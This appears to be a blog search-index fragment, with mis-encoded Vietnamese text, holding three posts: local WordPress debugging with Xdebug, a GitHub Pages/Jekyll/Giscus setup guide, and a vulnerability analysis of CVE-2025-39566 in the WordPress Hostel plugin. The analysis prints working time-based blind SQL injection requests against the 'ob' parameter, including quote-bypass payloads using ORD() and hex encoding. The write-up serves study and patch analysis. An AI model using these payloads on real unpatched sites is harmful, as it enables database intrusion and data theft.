https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); ","permalink":"//localhost:1313/vi/posts/2025-08-21-wordpress-local-and-debugging/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction Khi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\nGithub Pages: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\nJekyll: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\nGiscus: M·ªôt h·ªá th·ªëng b√¨nh lu·∫≠n hi·ªán ƒë·∫°i d·ª±a tr√™n GitHub Discussions. Thay v√¨ ph·∫£i d√πng d·ªãch v·ª• ngo√†i nh∆∞ Disqus, b·∫°n c√≥ th·ªÉ t·∫≠n d·ª•ng GitHub ƒë·ªÉ qu·∫£n l√Ω comment, v·ª´a g·ªçn nh·∫π v·ª´a th√¢n thi·ªán v·ªõi developer.\nRequirements T√†i kho·∫£n Github Ki·∫øn th·ª©c c∆° b·∫£n v·ªÅ Markdown Creating a Site Repository ·ªû ƒë√¢y, t√¥i s·ª≠ d·ª•ng Chirpy themes, ƒë√¢y l√† theme kh√° n·ªïi ti·∫øng d√†nh cho GitHub Pages, ƒë∆∞·ª£c t·ªëi ∆∞u cho vi·ªác vi·∫øt blog c√° nh√¢n ho·∫∑c technical blog.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nƒêƒÉng nh·∫≠p v√†o Github v√† di chuy·ªÉn ƒë·∫øn starter Thay v√¨ Fork, ta click Use this template v√† ch·ªçn Create a new repository ƒë·ªÉ t·ª± ƒë·ªông t·∫°o Site Repository. ƒê·∫∑t t√™n cho Repository m·ªõi \u0026lt;username\u0026gt;.github.io, thay ƒë·ªïi \u0026lt;username\u0026gt; th√†nh Github username c·ªßa b·∫°n. Setting up the Environment C√≥ 2 l√Ω do ch√≠nh b·∫°n n√™n setup m√¥i tr∆∞·ªùng tr√™n m√°y local khi ph√°t tri·ªÉn blog:\nSau khi push code l√™n Repository, GitHub Actions s·∫Ω m·∫•t m·ªôt kho·∫£ng th·ªùi gian ƒë·ªÉ ch·∫°y r·ªìi m·ªõi build v√† render ra GitHub Pages. Khi dev tr·ª±c ti·∫øp tr√™n local, b·∫°n c√≥ th·ªÉ quan s√°t k·∫øt qu·∫£ ngay l·∫≠p t·ª©c, nhanh h∆°n v√† thu·∫≠n ti·ªán h∆°n. Using Dev Containers (Recommended for Windows) Dev Containers cung c·∫•p m·ªôt m√¥i tr∆∞·ªùng c√¥ l·∫≠p b·∫±ng Docker, gi√∫p tr√°nh xung ƒë·ªôt v·ªõi h·ªá th·ªëng v√† ƒë·∫£m b·∫£o m·ªçi dependency ƒë·ªÅu ƒë∆∞·ª£c qu·∫£n l√Ω trong container.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t Docker: Tr√™n Windows/macOS: c√†i Docker Desktop. Tr√™n Linux: c√†i Docker Engine. C√†i VS Code v√† extension Dev Containers. Clone repository: N·∫øu d√πng Docker Desktop: m·ªü VS Code v√† clone repo trong container volume. N·∫øu d√πng Docker Engine: clone repo v·ªÅ local, sau ƒë√≥ m·ªü b·∫±ng container trong VS Code. Ch·ªù qu√° tr√¨nh thi·∫øt l·∫≠p Dev Containers ho√†n t·∫•t. Setting up Natively (Recommended for Unix-like OS) V·ªõi c√°c h·ªá ƒëi·ªÅu h√†nh d·∫°ng Unix-like (Linux, macOS), b·∫°n c√≥ th·ªÉ setup m√¥i tr∆∞·ªùng tr·ª±c ti·∫øp (native) ƒë·ªÉ ƒë·∫°t hi·ªáu nƒÉng t·ªët nh·∫•t. Ngo√†i ra, v·∫´n c√≥ th·ªÉ d√πng Dev Containers nh∆∞ m·ªôt l·ª±a ch·ªçn thay th·∫ø.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nL√†m theo h∆∞·ªõng d·∫´n c√†i ƒë·∫∑t Jekyll v√† ƒë·∫£m b·∫£o ƒë√£ c√†i ƒë·∫∑t Git. Clone repository v·ªÅ m√°y local. N·∫øu b·∫°n fork theme, c√†i Node.js v√† ch·∫°y bash tools/init.sh trong th∆∞ m·ª•c g·ªëc ƒë·ªÉ kh·ªüi t·∫°o repo. Ch·∫°y l·ªánh d∆∞·ªõi ƒë√¢y ·ªü th∆∞ m·ª•c g·ªëc ƒë·ªÉ to√†n b·ªô gem s·∫Ω ƒë∆∞·ª£c c√†i v√†o ./vendor/bundle/ trong project, kh√¥ng c·∫ßn sudo v√† kh√¥ng ƒë·ª•ng g√¨ ƒë·∫øn /var/lib/gems.. bundle config set --local path \u0026#39;vendor/bundle\u0026#39; bundle install Usage Start the Jekyll Server ƒê·ªÉ ch·∫°y site tr√™n local, s·ª≠ d·ª•ng l·ªánh d∆∞·ªõi ƒë√¢y:\nbundle exec jekyll s Configuration M·ªôt s·ªë bi·∫øn c·∫ßn c·∫•u h√¨nh trong _config.yml, bao g·ªìm:\nlang: Set language cho website c·ªßa b·∫°n url: Tr·ªè ƒë·∫øn website c·ªßa b·∫°n title: Title ch√≠nh, n·∫±m d∆∞·ªõi avatar tagline: Subtitle, m√¥ t·∫£ trang web avatar: h·ªó tr·ª£ local v√† CORS resources, c√≥ th·ªÉ s·ª≠ d·ª•ng gif Comment feature via Giscus Ta s·ª≠ d·ª•ng Giscus l√†m h·ªá th·ªëng comment cho website, ngo√†i ra c√≤n c√°c option kh√°c nh∆∞: Disqus, Utterances, t·∫•t c·∫£ ƒë·ªÅu mi·ªÖn ph√≠.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t giscus v√†o Github. V√†o Settings c·ªßa repository ch·ªçn General v√† b·∫≠t Discussions ƒë·ªÉ giscus l∆∞u comments v√†o Discussions. Nh·∫≠p repository \u0026lt;username\u0026gt;/\u0026lt;username\u0026gt;.github.io, th√¥ng b√°o m√†u xanh l√° xu·∫•t hi·ªán khi c√°c ti√™u ch√≠ ·ªü tr√™n ƒë∆∞·ª£c ƒë√°p ·ª©ng. Ch·ªçn th·ªÉ lo·∫°i discussion v√† ch·ªß ƒë·ªÅ cho website. C·∫•u h√¨nh giscus trong _config.yml provider: ch·ªçn giscus giscus: mapping c√°c bi·∫øn t∆∞∆°ng ·ª©ng ƒë√£ l√†m ·ªü giscus v√†o bi·∫øn giscus. Customize the Favicon T·∫°o favicon ri√™ng cho website c·ªßa b·∫°n, kh√¥ng ph·∫£i s·ª≠ d·ª•ng favicon m·∫∑c ƒë·ªãnh c·ªßa themes\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nTruy c·∫≠p Favicon Genarate Click Browse ch·ªçn favicon c·∫ßn t·∫°o, sau ƒë√≥ click Create Favicon ƒë·ªÉ t·∫°o. Click Download the generated favicon ƒë·ªÉ t·∫£i c√°c file ch·ª©a c√°c favicon v·ªÅ. Gi·∫£i n√©n file v·ª´a t·∫£i, x√≥a 2 file d∆∞·ªõi ƒë√¢y: browserconfig.xml site.webmanifest Copy to√†n b·ªô file c√≤n l·∫°i v√† paste v√†o assets/img/favicons(n·∫øu ch∆∞a c√≥ th√¨ t·∫°o). Extends Remove meta tag in Footer C√≥ th·ªÉ x√≥a d√≤ng Using the Chirpy theme for Jekyll. b·∫±ng c√°c b∆∞·ªõc sau:\nT·∫°o file theo ƒë∆∞·ªùng d·∫´n sau _data/locales/en.yml. Copy n·ªôi dung en.yml v√† d√°n v√†o file v·ª´a t·∫°o. S·ª≠a n·ªôi dung bi·∫øn meta th√†nh \u0026quot;\u0026quot; Write a post Tham kh·∫£o rule ƒë·ªÉ vi·∫øt blog c·ªßa themes v√† s·ª≠ d·ª•ng Live Preview ƒë·ªÉ quan s√°t\n","permalink":"//localhost:1313/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eKhi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGithub Pages\u003c/strong\u003e: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eJekyll\u003c/strong\u003e: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\u003c/p\u003e","title":"Github Pages with Jekyll themes and Giscus"},{"content":"L·ªó h·ªïng trong plugin Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file controllers/bookings.php\nB·∫£n l·ªó h·ªïng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } B·∫£n v√°:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } üëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nHow it work? ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C√¢u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } ·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ l√†m s·∫°ch HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nConclusion L·ªó h·ªïng CVE-2025-39566 trong plugin WordPress Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ 